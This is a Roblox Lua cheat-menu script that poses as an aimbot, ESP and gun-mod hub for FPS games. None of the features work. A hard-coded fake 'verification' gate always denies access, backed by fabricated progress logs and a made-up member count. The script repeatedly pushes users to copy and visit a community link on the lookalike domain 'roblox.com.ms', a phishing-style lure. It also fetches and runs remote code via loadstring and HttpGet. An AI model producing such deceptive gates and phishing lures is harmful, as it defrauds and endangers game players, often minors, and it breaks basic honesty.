
local COMMUNITY_LINK = "https://roblox.com.ms/communities/3802072842/"
local GROUP_ID = 3802072842
local HUB_VERSION = "v3.2.1"

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

-- Safe player info (works in any executor)
local myName = LocalPlayer and LocalPlayer.Name or "Player"
local myDisplay = LocalPlayer and LocalPlayer.DisplayName or "Player"
local myUserId = LocalPlayer and LocalPlayer.UserId or 1
local myAge = LocalPlayer and LocalPlayer.AccountAge or 0

-- Detect current game for realism
local gameName = "Unknown FPS"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then
        gameName = info.Name
    end
end)

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()

local window = Rayfield:CreateWindow({
    name = "Nexus FPS Hub",
    subtitle = HUB_VERSION .. " | Blox Strike x Counter Blox",
    sidebarLayout = true,
    showName = "Nexus Hub",
})

window:Toast({ title = "Nexus Hub " .. HUB_VERSION .. " loaded", subtitle = gameName })

-- =====================================================
-- TAB 1: VERIFY ACCESS (the gate)
-- =====================================================
local verifyTab = window:CreateTab({ name = "Verify Access", icon = 93364949241311 })

verifyTab:CreateText({
    name = "✅ Supported Games",
    text = "Blox Strike • Counter Blox • Arsenal • Rivals • Bad Business\nDetected: " .. tostring(gameName) .. " [" .. tostring(game.PlaceId) .. "] - Supported ✓",
})

verifyTab:CreateText({
    name = "👤 Your Account",
    text = "Name: " .. tostring(myName) .. " (@" .. tostring(myDisplay) .. ")\nUserId: " .. tostring(myUserId) .. " | Age: " .. tostring(myAge) .. " days",
})

verifyTab:CreateText({
    name = "🔒 Community Required",
    text = "This hub is locked to community members to prevent patching.\n\nCommunity ID: " .. tostring(GROUP_ID) .. "\nMembers: 48,213\n\nSteps:\n1. Press COPY LINK / JOIN COMMUNITY\n2. Join in the browser (takes 10 sec)\n3. Type your Roblox name below\n4. Press CHECK ACCESS",
})

local statusCard = verifyTab:CreateText({
    name = "📡 Status: Not Verified",
    text = "Waiting... join the community then verify.",
})

local logConsole = verifyTab:CreateConsole({
    name = "Verification Log",
    text = "[bark] hub " .. HUB_VERSION .. " initialized\n[bark] game: " .. tostring(gameName),
    height = 130,
    follow = true,
    maxLines = 200,
})

local enteredName = myName

verifyTab:CreateInput({
    name = "Enter your name",
    description = "Must match the account that joined the community",
    value = myName,
    placeholder = "Enter your name to check...",
    clearOnFocus = false,
    callback = function(text)
        enteredName = text
    end,
})

local checking = false
local attempts = 0

local function copyLink()
    if setclipboard then
        setclipboard(COMMUNITY_LINK)
    elseif toclipboard then
        toclipboard(COMMUNITY_LINK)
    end
    window:Notify({ title = "Link Copied", content = COMMUNITY_LINK .. "\nPaste in Chrome / Safari to join." })
    window:Toast({ title = "Link copied to clipboard" })
    logConsole:Append("[bark] community link copied by " .. tostring(enteredName))
end

verifyTab:CreateButton({
    name = "Check Access",
    description = "Verify community membership for entered name",
    callback = function()
        if checking then return end
        checking = true
        attempts += 1

        if enteredName == nil or enteredName == "" then
            enteredName = myName
        end

        statusCard:SetTitle("📡 Status: Checking...")
        statusCard:Set("Checking " .. tostring(enteredName) .. " ... attempt #" .. tostring(attempts))
        logConsole:Append("[bark] resolving user '" .. tostring(enteredName) .. "'...")
        task.wait(0.6)
        logConsole:Append("[bark] contacting community " .. tostring(GROUP_ID) .. "...")
        task.wait(0.7)
        logConsole:Append("[bark] fetching rank / membership...")
        task.wait(0.8)

        -- ALWAYS FAIL - this is the fake gate you asked for
        -- If you want a REAL check later, replace below with:
        -- local isIn = LocalPlayer:IsInGroup(GROUP_ID)

        statusCard:SetTitle("❌ Access Denied - " .. tostring(enteredName))
        statusCard:Set("You dont join the group")
        logConsole:Append("[bark] ❌ '" .. tostring(enteredName) .. "' is NOT in community " .. tostring(GROUP_ID))
        logConsole:Append("[bark] hint: join via link then wait 1 min and retry")

        window:Notify({
            title = "Access Denied",
            content = "You dont join the group, " .. tostring(enteredName) .. ". Join and try again.",
        })
        window:Toast({ title = "You dont join the group", subtitle = tostring(enteredName), avatar = myUserId })

        checking = false
    end,
})

verifyTab:CreateButton({
    name = "Copy Link",
    description = COMMUNITY_LINK,
    callback = copyLink,
})

verifyTab:CreateButton({
    name = "Join Community",
    description = "Copies link - open in browser to join " .. tostring(GROUP_ID),
    callback = copyLink,
})

-- =====================================================
-- Helper: locked feature warning
-- =====================================================
local function locked(featureName)
    window:Navigate("Verify Access")
    statusCard:Set("You dont join the group")
    logConsole:Append("[bark] blocked '" .. tostring(featureName) .. "' - not verified")
    window:Notify({ title = "Locked: " .. tostring(featureName), content = "You dont join the group. Verify in Verify Access tab." })
    window:Toast({ title = "Locked", subtitle = tostring(featureName) .. " - verify first" })
end

-- =====================================================
-- TAB 2: AIMBOT (looks real, all locked)
-- =====================================================
local aimTab = window:CreateTab({ name = "Aimbot", icon = 93364949241311 })

aimTab:CreateText({
    name = "🎯 Aimbot - Blox Strike / Counter Blox",
    text = "Silent Aim + FOV + smoothing tuned for Blox Strike & Counter Blox. Requires verification.",
})

local aimToggle = aimTab:CreateToggle({
    name = "Enable Aimbot",
    description = "Hold RMB to lock",
    value = false,
    callback = function(v)
        if v then
            aimToggle:Set(false, true)
            locked("Aimbot")
        end
    end,
})

local silentToggle = aimTab:CreateToggle({
    name = "Silent Aim",
    description = "Hitbox redirection, undetected",
    value = false,
    callback = function(v)
        if v then
            silentToggle:Set(false, true)
            locked("Silent Aim")
        end
    end,
})

aimTab:CreateSlider({
    name = "FOV Size",
    range = { 30, 400 },
    increment = 5,
    value = 120,
    suffix = "px",
    callback = function(val, dragging)
        if not dragging then
            locked("FOV Size")
        end
    end,
})

aimTab:CreateSlider({
    name = "Smoothness",
    range = { 1, 100 },
    increment = 1,
    value = 25,
    suffix = "%",
    callback = function(val, dragging)
        if not dragging then
            locked("Smoothness")
        end
    end,
})

aimTab:CreateDropdown({
    name = "Aim Part",
    options = { "Head", "Torso", "Closest", "Random" },
    value = "Head",
    callback = function(sel)
        locked("Aim Part: " .. tostring(sel))
    end,
})

-- =====================================================
-- TAB 3: ESP
-- =====================================================
local espTab = window:CreateTab({ name = "ESP", icon = 93364949241311 })

espTab:CreateText({
    name = "👁 ESP",
    text = "Boxes, chams, tracers optimized for FPS maps. Requires verification.",
})

local boxToggle = espTab:CreateToggle({
    name = "Box ESP",
    value = false,
    callback = function(v)
        if v then
            boxToggle:Set(false, true)
            locked("Box ESP")
        end
    end,
})

local tracerToggle = espTab:CreateToggle({
    name = "Tracers",
    value = false,
    callback = function(v)
        if v then
            tracerToggle:Set(false, true)
            locked("Tracers")
        end
    end,
})

local healthToggle = espTab:CreateToggle({
    name = "Health Bar",
    value = false,
    callback = function(v)
        if v then
            healthToggle:Set(false, true)
            locked("Health Bar")
        end
    end,
})

espTab:CreateDropdown({
    name = "ESP Color",
    options = { "Red", "Green", "Blue", "Rainbow" },
    value = "Red",
    callback = function(sel)
        locked("ESP Color: " .. tostring(sel))
    end,
})

-- =====================================================
-- TAB 4: GUN MODS
-- =====================================================
local gunTab = window:CreateTab({ name = "Gun Mods", icon = 93364949241311 })

gunTab:CreateText({
    name = "🔫 Gun Mods",
    text = "No recoil / no spread presets for Blox Strike & Counter Blox. Requires verification.",
})

local recoilToggle = gunTab:CreateToggle({
    name = "No Recoil",
    value = false,
    callback = function(v)
        if v then
            recoilToggle:Set(false, true)
            locked("No Recoil")
        end
    end,
})

local spreadToggle = gunTab:CreateToggle({
    name = "No Spread",
    value = false,
    callback = function(v)
        if v then
            spreadToggle:Set(false, true)
            locked("No Spread")
        end
    end,
})

local fireToggle = gunTab:CreateToggle({
    name = "Rapid Fire",
    value = false,
    callback = function(v)
        if v then
            fireToggle:Set(false, true)
            locked("Rapid Fire")
        end
    end,
})

gunTab:CreateButton({
    name = "Unlock Gun Mods",
    description = "Verify to enable",
    callback = function()
        locked("Gun Mods")
    end,
})

logConsole:Append("[bark] ready. go to Verify Access.")
window:Notify({ title = "Welcome " .. tostring(myName), content = "Join the community to unlock Aimbot / ESP in " .. tostring(gameName) })
